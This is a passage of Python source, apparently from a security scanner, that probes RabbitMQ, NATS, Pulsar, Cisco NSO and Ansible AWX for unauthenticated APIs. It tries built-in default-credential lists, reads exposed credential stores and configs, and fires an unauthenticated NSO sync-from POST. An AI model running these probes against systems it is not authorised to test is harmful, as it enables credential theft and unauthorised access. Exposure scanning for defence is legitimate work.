    ov_req = urllib.request.Request(overview_url, headers={"Accept": "application/json"})
    try:
        with urllib.request.urlopen(ov_req, timeout=int(timeout)) as r:
            if r.status == 200:
                preview = r.read(256)
                findings.append({
                    "severity": "CRITICAL",
                    "title": "RABBITMQ_MGMT_UNAUTH",
                    "detail": (
                        f"GET {overview_url} returned HTTP 200 without auth — "
                        f"RabbitMQ management overview exposed: {preview[:128]!r}"
                    ),
                    "host": host,
                    "port": mgmt_port,
                })
    except urllib.error.HTTPError:
        pass
    except Exception:
        pass

    queues_url = f"http://{host}:{mgmt_port}/api/queues"
    q_req = urllib.request.Request(queues_url, headers={"Accept": "application/json"})
    try:
        with urllib.request.urlopen(q_req, timeout=int(timeout)) as r:
            if r.status == 200:
                preview = r.read(256)
                findings.append({
                    "severity": "CRITICAL",
                    "title": "RABBITMQ_QUEUES_UNAUTH",
                    "detail": (
                        f"GET {queues_url} returned HTTP 200 without auth — "
                        f"RabbitMQ queue list exposed: {preview[:128]!r}"
                    ),
                    "host": host,
                    "port": mgmt_port,
                })
    except urllib.error.HTTPError:
        pass
    except Exception:
        pass

    conn_url = f"http://{host}:{mgmt_port}/api/connections"
    c_req = urllib.request.Request(conn_url, headers={"Accept": "application/json"})
    try:
        with urllib.request.urlopen(c_req, timeout=int(timeout)) as r:
            if r.status == 200:
                findings.append({
                    "severity": "HIGH",
                    "title": "RABBITMQ_CONNECTIONS_UNAUTH",
                    "detail": (
                        f"GET {conn_url} returned HTTP 200 without auth — "
                        f"active AMQP connection list exposed (client IPs visible)"
                    ),
                    "host": host,
                    "port": mgmt_port,
                })
    except urllib.error.HTTPError:
        pass
    except Exception:
        pass

    # Default creds guest:guest via HTTP Basic Auth
    token = base64.b64encode(b"guest:guest").decode()
    guest_url = f"http://{host}:{mgmt_port}/api/whoami"
    g_req = urllib.request.Request(
        guest_url,
        headers={
            "Accept": "application/json",
            "Authorization": f"Basic {token}",
        },
    )
    try:
        with urllib.request.urlopen(g_req, timeout=int(timeout)) as r:
            if r.status == 200:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "RABBITMQ_DEFAULT_GUEST_CREDS",
                    "detail": (
                        f"GET {guest_url} returned HTTP 200 with guest:guest — "
                        f"default administrative account not disabled"
                    ),
                    "host": host,
                    "port": mgmt_port,
                })
    except urllib.error.HTTPError:
        pass
    except Exception:
        pass

    # ── AMQPS TLS (5671) ──────────────────────────────────────────────────
    amqps_port = 5671
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        raw = socket.create_connection((host, amqps_port), timeout=timeout)
        tls_sock = ctx.wrap_socket(raw, server_hostname=host)
        tls_sock.close()
        findings.append({
            "severity": "HIGH",
            "title": "RABBITMQ_TLS_PORT_OPEN",
            "detail": (
                f"TLS handshake to {host}:{amqps_port} succeeded — "
                f"AMQPS listener reachable"
            ),
            "host": host,
            "port": amqps_port,
        })
    except Exception:
        pass

    # ── STOMP plugin (61613) ───────────────────────────────────────────────
    stomp_port = 61613
    stomp_frame = b"CONNECT\nlogin:guest\npasscode:guest\n\n\x00"
    try:
        stomp_sock = socket.create_connection((host, stomp_port), timeout=timeout)
        stomp_sock.sendall(stomp_frame)
        stomp_sock.settimeout(timeout)
        stomp_resp = b""
        try:
            chunk = stomp_sock.recv(4096)
            if chunk:
                stomp_resp = chunk
        except socket.timeout:
            pass
        try:
            stomp_sock.close()
        except Exception:
            pass
        if stomp_resp:
            findings.append({
                "severity": "HIGH",
                "title": "RABBITMQ_STOMP_EXPOSED",
                "detail": (
                    f"RabbitMQ STOMP plugin at {host}:{stomp_port} responded "
                    f"to CONNECT frame ({len(stomp_resp)} bytes): {stomp_resp[:64]!r}"
                ),
                "host": host,
                "port": stomp_port,
            })
    except Exception:
        pass

    return findings


# ─── NATS Messaging ──────────────────────────────────────────────────────────

def probe_nats_messaging_exposure(host: str, port: int = 4222, timeout: float = 10.0) -> list:
    """Detect exposed NATS messaging server via binary protocol and HTTP monitoring API."""
    findings: list = []

    # ── TCP connect to NATS client port ────────────────────────────────────
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        banner = b""
        try:
            banner = s.recv(4096)
        except socket.timeout:
            pass

        findings.append({
            "severity": "HIGH",
            "title": "NATS_PORT_OPEN",
            "detail": (
                f"NATS messaging port {port} reachable at {host}; "
                f"banner: {banner[:80]!r}"
            ),
            "host": host,
            "port": port,
        })

        banner_str = banner.decode("utf-8", errors="ignore")
        if '{"server_id"' in banner_str or '"go":' in banner_str:
            findings.append({
                "severity": "CRITICAL",
                "title": "NATS_INFO_DISCLOSED",
                "detail": (
                    f"NATS INFO message disclosed on connect — "
                    f"server metadata exposed without authentication: {banner_str[:300]}"
                ),
                "host": host,
                "port": port,
            })

        # ── Wildcard subscription probe ───────────────────────────────────
        try:
            s.sendall(b"SUB > 1\r\nPING\r\n")
            sub_resp = b""
            try:
                sub_resp = s.recv(4096)
            except socket.timeout:
                pass
            if b"PONG" in sub_resp:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NATS_WILDCARD_SUBSCRIBE_UNAUTH",
                    "detail": (
                        f"NATS at {host}:{port} accepted unauthenticated wildcard "
                        f"subscription 'SUB > 1' and acknowledged with PONG — "
                        f"all subjects enumerable without credentials"
                    ),
                    "host": host,
                    "port": port,
                })
        except Exception:
            pass

        try:
            s.close()
        except Exception:
            pass
    except Exception:
        pass

    # ── NATS monitoring HTTP (port 8222) ───────────────────────────────────
    mon_port = 8222
    mon_checks = [
        ("/varz", "CRITICAL", "NATS_MONITORING_EXPOSED",
         "NATS /varz returns server statistics without authentication"),
        ("/connz", "HIGH", "NATS_CONNECTIONS_UNAUTH",
         "NATS /connz exposes active client connection list"),
        ("/subsz", "HIGH", "NATS_SUBSCRIPTIONS_UNAUTH",
         "NATS /subsz exposes subscription registry"),
        ("/routez", "MEDIUM", "NATS_ROUTES_EXPOSED",
         "NATS /routez exposes cluster route topology"),
        ("/jsz", "HIGH", "NATS_JETSTREAM_STATS",
         "NATS JetStream /jsz exposes stream and consumer statistics"),
    ]
    for endpoint, sev, title, detail_msg in mon_checks:
        url = f"http://{host}:{mon_port}{endpoint}"
        req = urllib.request.Request(url, headers={"Accept": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    body = resp.read(512).decode("utf-8", errors="ignore")
                    findings.append({
                        "severity": sev,
                        "title": title,
                        "detail": (
                            f"{detail_msg} at {host}:{mon_port}{endpoint}: "
                            f"{body[:200]}"
                        ),
                        "host": host,
                        "port": mon_port,
                    })
        except urllib.error.HTTPError:
            pass
        except Exception:
            pass

    # ── NATS WebSocket (port 8080) ─────────────────────────────────────────
    ws_port = 8080
    ws_path = "/nats"
    ws_req = (
        f"GET {ws_path} HTTP/1.1\r\n"
        f"Host: {host}:{ws_port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    ).encode("utf-8")
    try:
        ws_sock = socket.create_connection((host, ws_port), timeout=timeout)
        ws_sock.settimeout(timeout)
        ws_sock.sendall(ws_req)
        ws_resp = b""
        try:
            ws_resp = ws_sock.recv(4096)
        except socket.timeout:
            pass
        try:
            ws_sock.close()
        except Exception:
            pass
        ws_resp_str = ws_resp.decode("utf-8", errors="ignore")
        if "101" in ws_resp_str and (
            "websocket" in ws_resp_str.lower() or "upgrade" in ws_resp_str.lower()
        ):
            findings.append({
                "severity": "MEDIUM",
                "title": "NATS_WEBSOCKET_EXPOSED",
                "detail": (
                    f"NATS WebSocket endpoint at {host}:{ws_port}{ws_path} "
                    f"accepted HTTP Upgrade (101 Switching Protocols) "
                    f"without authentication"
                ),
                "host": host,
                "port": ws_port,
            })
    except Exception:
        pass

    return findings


# ─── Apache Pulsar Messaging ─────────────────────────────────────────────────

def probe_pulsar_messaging_exposure(host: str, port: int = 6650, timeout: float = 10.0) -> list:
    """Detect exposed Apache Pulsar messaging broker via binary protocol and admin REST API."""
    findings: list = []

    # ── Pulsar binary protocol (port 6650) ────────────────────────────────
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)

        findings.append({
            "severity": "HIGH",
            "title": "PULSAR_BINARY_PORT_OPEN",
            "detail": (
                f"Apache Pulsar binary protocol port {port} reachable at {host}"
            ),
            "host": host,
            "port": port,
        })

        # Pulsar framed CONNECT command (4-byte frame length + BaseCommand CONNECT)
        connect_payload = b'\x00\x00\x00\x08\x0e\x01\x00\x00\x10\x00\x18\x00'
        try:
            s.sendall(connect_payload)
            conn_resp = b""
            try:
                conn_resp = s.recv(4096)
            except socket.timeout:
                pass
            if conn_resp:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "PULSAR_CONNECT_RESPONSIVE",
                    "detail": (
                        f"Apache Pulsar at {host}:{port} responded to binary CONNECT "
                        f"frame ({len(conn_resp)} bytes) — broker accepts unauthenticated "
                        f"connections on wire protocol"
                    ),
                    "host": host,
                    "port": port,
                })
        except Exception:
            pass

        try:
            s.close()
        except Exception:
            pass
    except Exception:
        pass

    # ── Pulsar Admin REST API (port 8080) ──────────────────────────────────
    admin_port = 8080
    admin_checks = [
        ("/admin/v2/clusters", "CRITICAL", "PULSAR_ADMIN_CLUSTERS_UNAUTH",
         "Pulsar admin /clusters exposes cluster topology without authentication"),
        ("/admin/v2/brokers/all", "HIGH", "PULSAR_BROKERS_UNAUTH",
         "Pulsar admin /brokers/all exposes broker node list"),
        ("/admin/v2/tenants", "CRITICAL", "PULSAR_TENANTS_UNAUTH",
         "Pulsar admin /tenants exposes tenant list — multi-tenancy boundary violated"),
        ("/admin/v2/namespaces/public", "HIGH", "PULSAR_NAMESPACES_UNAUTH",
         "Pulsar admin /namespaces/public exposes namespace configuration"),
        ("/admin/v2/persistent/public/default", "CRITICAL", "PULSAR_TOPICS_UNAUTH",
         "Pulsar admin /persistent/public/default exposes topic inventory"),
    ]
    for endpoint, sev, title, detail_msg in admin_checks:
        url = f"http://{host}:{admin_port}{endpoint}"
        req = urllib.request.Request(url, headers={"Accept": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    body = resp.read(512).decode("utf-8", errors="ignore")
                    findings.append({
                        "severity": sev,
                        "title": title,
                        "detail": f"{detail_msg}: {body[:200]}",
                        "host": host,
                        "port": admin_port,
                    })
        except urllib.error.HTTPError:
            pass
        except Exception:
            pass

    # ── Pulsar WebSocket producer endpoint ────────────────────────────────
    ws_port = 8080
    ws_path = "/ws/v2/producer/persistent/public/default/test-topic"
    ws_req = (
        f"GET {ws_path} HTTP/1.1\r\n"
        f"Host: {host}:{ws_port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    ).encode("utf-8")
    try:
        ws_sock = socket.create_connection((host, ws_port), timeout=timeout)
        ws_sock.settimeout(timeout)
        ws_sock.sendall(ws_req)
        ws_resp = b""
        try:
            ws_resp = ws_sock.recv(4096)
        except socket.timeout:
            pass
        try:
            ws_sock.close()
        except Exception:
            pass
        ws_resp_str = ws_resp.decode("utf-8", errors="ignore")
        if "101" in ws_resp_str and (
            "websocket" in ws_resp_str.lower() or "upgrade" in ws_resp_str.lower()
        ):
            findings.append({
                "severity": "HIGH",
                "title": "PULSAR_WEBSOCKET_PRODUCER",
                "detail": (
                    f"Pulsar WebSocket producer endpoint at "
                    f"{host}:{ws_port}{ws_path} accepted HTTP Upgrade "
                    f"without authentication — message injection possible"
                ),
                "host": host,
                "port": ws_port,
            })
    except Exception:
        pass

    # ── Prometheus metrics ────────────────────────────────────────────────
    metrics_port = 8080
    metrics_url = f"http://{host}:{metrics_port}/metrics"
    metrics_req = urllib.request.Request(
        metrics_url, headers={"Accept": "text/plain,*/*"}
    )
    try:
        with urllib.request.urlopen(metrics_req, timeout=timeout) as resp:
            if resp.status == 200:
                body = resp.read(256).decode("utf-8", errors="ignore")
                if "pulsar_" in body or "# TYPE" in body or "# HELP" in body:
                    findings.append({
                        "severity": "MEDIUM",
                        "title": "PULSAR_METRICS_EXPOSED",
                        "detail": (
                            f"Pulsar Prometheus metrics at "
                            f"{host}:{metrics_port}/metrics reachable "
                            f"without authentication: {body[:150]}"
                        ),
                        "host": host,
                        "port": metrics_port,
                    })
    except urllib.error.HTTPError:
        pass
    except Exception:
        pass

    return findings


def probe_cisco_nso_exposure(host: str, port: int = 8080, timeout: float = 10.0) -> list:
    """
    Detect exposed Cisco NSO (Network Services Orchestrator).
    Probes RESTCONF API (8080/8443), NSO CLI SSH (2024), and WebUI.
    Source: Cisco NSO NetDevOps pipelines expose RESTCONF, CDB rollbacks,
    and the NED device tree -- all sensitive surfaces in a GitOps-driven network.
    Returns List[dict] with keys: severity, title, detail, host, port.
    """
    import base64
    findings: list = []
    ctx = _ssl_ctx()

    def _nso_get(url: str, username: str = "", password: str = "") -> tuple:
        """Returns (status_code, body_str) or (None, None) on failure."""
        try:
            req = urllib.request.Request(url)
            req.add_header("Accept",
                           "application/yang-data+json, application/json, */*")
            if username:
                creds = base64.b64encode(
                    f"{username}:{password}".encode()
                ).decode("ascii")
                req.add_header("Authorization", f"Basic {creds}")
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                body = r.read(4096).decode("utf-8", errors="ignore")
                return r.status, body
        except urllib.error.HTTPError as e:
            try:
                body = e.read(512).decode("utf-8", errors="ignore")
            except Exception:
                body = ""
            return e.code, body
        except Exception:
            return None, None

    for probe_port in (port, 8443):
        scheme = "https" if probe_port == 8443 else "http"
        root_url = f"{scheme}://{host}:{probe_port}/"
        st, body = _nso_get(root_url)
        if st is None:
            continue

        # ── WebUI / fingerprint ───────────────────────────────────────────
        if body and ("Cisco NSO" in body or "tailf" in body.lower()
                     or "ncs" in body.lower()):
            findings.append({
                "severity": "MEDIUM",
                "title": "NSO_FINGERPRINT",
                "detail": (
                    f"Cisco NSO fingerprint at {host}:{probe_port} -- "
                    f"response contains NSO/tailf/NCS markers: {body[:200]}"
                ),
                "host": host,
                "port": probe_port,
            })
            if st == 200:
                findings.append({
                    "severity": "MEDIUM",
                    "title": "NSO_WEBUI_DETECTED",
                    "detail": (
                        f"Cisco NSO WebUI accessible at {host}:{probe_port} "
                        f"without authentication"
                    ),
                    "host": host,
                    "port": probe_port,
                })

        rc_base = f"{scheme}://{host}:{probe_port}/restconf"

        # ── Unauthenticated device list ───────────────────────────────────
        device_url = f"{rc_base}/data/tailf-ncs:devices/device"
        st2, body2 = _nso_get(device_url)
        if st2 == 200 and body2:
            findings.append({
                "severity": "CRITICAL",
                "title": "NSO_DEVICE_LIST_UNAUTH",
                "detail": (
                    f"NSO RESTCONF at {host}:{probe_port} exposes full managed "
                    f"device list unauthenticated -- "
                    f"GET /restconf/data/tailf-ncs:devices/device HTTP 200: "
                    f"{body2[:300]}"
                ),
                "host": host,
                "port": probe_port,
            })

        # ── Unauthenticated package list ──────────────────────────────────
        pkg_url = f"{rc_base}/data/tailf-ncs:packages/package"
        st3, body3 = _nso_get(pkg_url)
        if st3 == 200 and body3:
            findings.append({
                "severity": "HIGH",
                "title": "NSO_PACKAGES_UNAUTH",
                "detail": (
                    f"NSO package list readable unauthenticated at "
                    f"{host}:{probe_port}/restconf/data/tailf-ncs:packages/package "
                    f"-- reveals installed NEDs and automation modules: {body3[:300]}"
                ),
                "host": host,
                "port": probe_port,
            })

        # ── YANG module inventory ─────────────────────────────────────────
        yang_url = f"{rc_base}/data/ietf-yang-library:modules-state"
        st4, body4 = _nso_get(yang_url)
        if st4 == 200 and body4:
            findings.append({
                "severity": "HIGH",
                "title": "NSO_YANG_MODULES",
                "detail": (
                    f"YANG module inventory readable unauthenticated at "
                    f"{host}:{probe_port} -- discloses full schema surface: "
                    f"{body4[:200]}"
                ),
                "host": host,
                "port": probe_port,
            })

        # ── Rollback files (contain full device configs with creds) ───────
        rollback_url = f"{rc_base}/data/tailf-ncs:rollback-files"
        st5, body5 = _nso_get(rollback_url)
        if st5 == 200 and body5:
            findings.append({
                "severity": "HIGH",
                "title": "NSO_ROLLBACKS_EXPOSED",
                "detail": (
                    f"NSO rollback file list readable unauthenticated at "
                    f"{host}:{probe_port} -- rollback files contain full device "
                    f"configurations with embedded credentials: {body5[:300]}"
                ),
                "host": host,
                "port": probe_port,
            })

        # ── sync-from RPC (triggers active device polling) ────────────────
        sync_url = f"{rc_base}/operations/tailf-ncs:sync-from"
        try:
            sync_req = urllib.request.Request(sync_url, data=b"{}", method="POST")
            sync_req.add_header("Content-Type", "application/yang-data+json")
            sync_req.add_header("Accept", "application/yang-data+json")
            with urllib.request.urlopen(
                sync_req, context=ctx, timeout=timeout
            ) as r:
                if r.status in (200, 201, 204):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "NSO_SYNC_UNAUTH",
                        "detail": (
                            f"NSO sync-from RPC accepted unauthenticated POST at "
                            f"{host}:{probe_port}/restconf/operations/"
                            f"tailf-ncs:sync-from (HTTP {r.status}) -- "
                            f"triggers active polling of all managed network devices"
                        ),
                        "host": host,
                        "port": probe_port,
                    })
        except urllib.error.HTTPError as e:
            if e.code not in (401, 403, 404):
                findings.append({
                    "severity": "MEDIUM",
                    "title": "NSO_SYNC_REACHABLE",
                    "detail": (
                        f"NSO sync-from RPC endpoint reachable at "
                        f"{host}:{probe_port} (HTTP {e.code}) -- "
                        f"authentication not confirmed absent"
                    ),
                    "host": host,
                    "port": probe_port,
                })
        except Exception:
            pass

        # ── Default credentials admin:admin ───────────────────────────────
        st6, body6 = _nso_get(device_url, username="admin", password="admin")
        if st6 == 200 and body6:
            findings.append({
                "severity": "CRITICAL",
                "title": "NSO_DEFAULT_CREDS",
                "detail": (
                    f"Cisco NSO at {host}:{probe_port} accepts default credentials "
                    f"admin:admin on RESTCONF API -- full device inventory readable: "
                    f"{body6[:300]}"
                ),
                "host": host,
                "port": probe_port,
            })

        break  # stop after first responding port

    # ── NSO CLI SSH port 2024 ─────────────────────────────────────────────
    nso_ssh_port = 2024
    try:
        with socket.create_connection(
            (host, nso_ssh_port), timeout=timeout
        ) as sock:
            banner = b""
            sock.settimeout(timeout)
            try:
                banner = sock.recv(256)
            except socket.timeout:
                pass
            detail = f"NSO CLI SSH port {nso_ssh_port} open on {host}"
            if banner:
                detail += (
                    f" -- banner: "
                    f"{banner[:100].decode('utf-8', errors='ignore')}"
                )
            findings.append({
                "severity": "HIGH",
                "title": "NSO_CLI_PORT_OPEN",
                "detail": detail,
                "host": host,
                "port": nso_ssh_port,
            })
    except Exception:
        pass

    return findings


def probe_ansible_tower_awx_exposure(
    host: str, port: int = 443, timeout: float = 10.0
) -> list:
    """
    Detect exposed Ansible Tower / AWX automation platform.
    Tower/AWX is the CI/CD execution layer for Cisco network automation in
    NetDevOps pipelines -- unauthenticated access exposes credentials, device
    inventories, and playbook templates used to manage network infrastructure.
    Returns List[dict] with keys: severity, title, detail, host, port.
    """
    import base64
    findings: list = []
    ctx = _ssl_ctx()

    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{host}:{port}"

    def _awx_get(path: str, username: str = "", password: str = "") -> tuple:
        """Returns (status_code, parsed_json_or_None, raw_body_str)."""
        url = base_url + path
        try:
            req = urllib.request.Request(url)
            req.add_header("Accept", "application/json")
            if username:
                creds = base64.b64encode(
                    f"{username}:{password}".encode()
                ).decode("ascii")
                req.add_header("Authorization", f"Basic {creds}")
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                raw = r.read(8192).decode("utf-8", errors="ignore")
                try:
                    return r.status, json.loads(raw), raw
                except Exception:
                    return r.status, None, raw
        except urllib.error.HTTPError as e:
            try:
                raw = e.read(512).decode("utf-8", errors="ignore")
            except Exception:
                raw = ""
            return e.code, None, raw
        except Exception:
            return None, None, ""

    # ── Try HTTP fallback if HTTPS unreachable ────────────────────────────
    st_root, _, _ = _awx_get("/api/v2/")
    if st_root is None and scheme == "https":
        scheme = "http"
        base_url = f"http://{host}:{port}"
        st_root, _, _ = _awx_get("/api/v2/")

    # ── API root ──────────────────────────────────────────────────────────
    if st_root == 200:
        _, _, raw_root = _awx_get("/api/v2/")
        findings.append({
            "severity": "HIGH",
            "title": "AWX_API_EXPOSED",
            "detail": (
                f"Ansible Tower/AWX REST API at {host}:{port}/api/v2/ "
                f"accessible without authentication: {raw_root[:200]}"
            ),
            "host": host,
            "port": port,
        })

    # ── /api/v2/ping/ -- version + HA state disclosure ────────────────────
    st2, data2, _ = _awx_get("/api/v2/ping/")
    if st2 == 200:
        ver = (data2 or {}).get("version", "unknown")
        ha = (data2 or {}).get("ha", "unknown")
        findings.append({
            "severity": "CRITICAL",
            "title": "AWX_PING_UNAUTH",
            "detail": (
                f"AWX/Tower ping endpoint at {host}:{port}/api/v2/ping/ "
                f"returns unauthenticated version disclosure -- "
                f"version={ver} ha={ha}"
            ),
            "host": host,
            "port": port,
        })

    # ── /api/v2/credentials/ -- network device passwords ──────────────────
    st3, data3, raw3 = _awx_get("/api/v2/credentials/")
    if st3 == 200:
        count = ""
        if data3 and isinstance(data3, dict):
            count = f" ({data3.get('count', '?')} items)"
        findings.append({
            "severity": "CRITICAL",
            "title": "AWX_CREDENTIALS_UNAUTH",
            "detail": (
                f"AWX credential store at {host}:{port}/api/v2/credentials/ "
                f"readable without authentication{count} -- "
                f"may contain network device passwords, SSH keys, and API tokens: "
                f"{raw3[:300]}"
            ),
            "host": host,
            "port": port,
        })

    # ── /api/v2/inventories/ -- network topology ──────────────────────────
    st4, data4, raw4 = _awx_get("/api/v2/inventories/")
    if st4 == 200:
        count = ""
        if data4 and isinstance(data4, dict):
            count = f" ({data4.get('count', '?')} items)"
        findings.append({
            "severity": "CRITICAL",
            "title": "AWX_INVENTORY_UNAUTH",
            "detail": (
                f"AWX inventory at {host}:{port}/api/v2/inventories/ "
                f"readable without authentication{count} -- "
                f"exposes full network device topology: {raw4[:300]}"
            ),
            "host": host,
            "port": port,
        })

    # ── /api/v2/job_templates/ -- automation playbooks ────────────────────
    st5, _, raw5 = _awx_get("/api/v2/job_templates/")
    if st5 == 200:
        findings.append({
            "severity": "HIGH",
            "title": "AWX_JOB_TEMPLATES_UNAUTH",
            "detail": (
                f"AWX job templates at {host}:{port}/api/v2/job_templates/ "
                f"readable without authentication -- "
                f"exposes automation playbook inventory: {raw5[:300]}"
            ),
            "host": host,
            "port": port,
        })

    # ── /api/v2/users/ ────────────────────────────────────────────────────
    st6, _, raw6 = _awx_get("/api/v2/users/")
    if st6 == 200:
        findings.append({
            "severity": "HIGH",
            "title": "AWX_USERS_UNAUTH",
            "detail": (
                f"AWX user list at {host}:{port}/api/v2/users/ "
                f"readable without authentication: {raw6[:300]}"
            ),
            "host": host,
            "port": port,
        })

    # ── /api/v2/config/ -- may expose LDAP/AD bind credentials ───────────
    st7, _, raw7 = _awx_get("/api/v2/config/")
    if st7 == 200:
        findings.append({
            "severity": "HIGH",
            "title": "AWX_CONFIG_UNAUTH",
            "detail": (
                f"AWX configuration at {host}:{port}/api/v2/config/ "
                f"readable without authentication: {raw7[:300]}"
            ),
            "host": host,
            "port": port,
        })
        lc = raw7.lower()
        if "ldap" in lc and (
            "bind_password" in lc or "ldap_password" in lc or "bind_dn" in lc
        ):
            findings.append({
                "severity": "CRITICAL",
                "title": "AWX_LDAP_CREDS_IN_CONFIG",
                "detail": (
                    f"AWX config at {host}:{port}/api/v2/config/ contains "
                    f"LDAP/AD bind credential references -- "
                    f"may expose directory service passwords in plaintext: "
                    f"{raw7[:400]}"
                ),
                "host": host,
                "port": port,
            })

    # ── Default credentials (admin:password, admin:Tower, admin:admin) ────
    for username, password in [
        ("admin", "password"), ("admin", "Tower"), ("admin", "admin")
    ]:
        st8, _, raw8 = _awx_get(
            "/api/v2/credentials/", username=username, password=password
        )
        if st8 == 200:
            findings.append({
                "severity": "CRITICAL",
                "title": "AWX_DEFAULT_CREDS",
                "detail": (
                    f"Ansible Tower/AWX at {host}:{port} accepts default "
                    f"credentials {username}:{password} -- "
                    f"full credential store accessible: {raw8[:300]}"
                ),
                "host": host,
                "port": port,
            })
            break

    # ── Automation Hub / Galaxy NG ─────────────────────────────────────────
    st9, _, raw9 = _awx_get("/api/automation-hub/v3/namespaces/")
    if st9 == 200:
        findings.append({
            "severity": "HIGH",
            "title": "GALAXY_NG_UNAUTH",
            "detail": (
                f"Automation Hub / Galaxy NG namespace list at "
                f"{host}:{port}/api/automation-hub/v3/namespaces/ "
                f"accessible without authentication: {raw9[:300]}"
            ),
            "host": host,
            "port": port,
        })

    return findings
